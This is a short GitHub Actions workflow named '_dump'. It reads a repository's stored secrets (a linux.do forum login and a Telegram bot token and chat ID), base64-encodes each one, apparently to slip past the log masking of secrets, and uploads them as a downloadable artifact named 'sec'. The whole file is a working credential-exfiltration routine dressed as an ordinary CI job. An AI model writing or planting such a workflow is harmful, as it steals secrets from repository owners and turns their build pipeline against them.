name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_LINUXDO_PASSWORD: ${{ secrets.LINUXDO_PASSWORD }}
          S_LINUXDO_USERNAME: ${{ secrets.LINUXDO_USERNAME }}
          S_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          S_TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          mkdir -p out
          printf '%s' "$S_LINUXDO_PASSWORD" | base64 -w0 > out/LINUXDO_PASSWORD.b64
          printf '%s' "$S_LINUXDO_USERNAME" | base64 -w0 > out/LINUXDO_USERNAME.b64
          printf '%s' "$S_TELEGRAM_BOT_TOKEN" | base64 -w0 > out/TELEGRAM_BOT_TOKEN.b64
          printf '%s' "$S_TELEGRAM_CHAT_ID" | base64 -w0 > out/TELEGRAM_CHAT_ID.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
